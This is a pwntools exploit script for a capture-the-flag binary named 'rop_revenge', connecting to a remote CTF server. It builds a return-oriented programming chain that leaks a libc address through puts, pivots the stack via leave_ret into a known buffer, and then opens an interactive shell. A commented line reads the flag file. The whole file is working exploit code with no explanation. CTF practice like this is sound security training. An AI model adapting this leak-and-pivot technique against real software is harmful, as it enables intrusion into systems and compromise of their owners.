#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

e , l = ELF('./rop_revenge') , ELF('./libc.so.6')

host , port = 'ctf.yuawn.idv.tw' , 10109
#host , port = '192.168.78.135' , 4000
y = remote( host , port )

name = 0x601080
main = 0x400676
puts_plt = 0x400520
pop_rdi = 0x4007a3
pop_rbp = 0x4005e0
leave_ret = 0x40072f

p = flat(
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    pop_rbp,
    name + 0x70,
    0x4006f1
)

print hex(e.plt['puts']) , hex(e.got['__libc_start_main']) , len(p)

y.sendafter( '?' , p )

p = flat(
    'D' * 0x20,
    name,
    leave_ret
)

y.sendafter( '?' , p )



#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()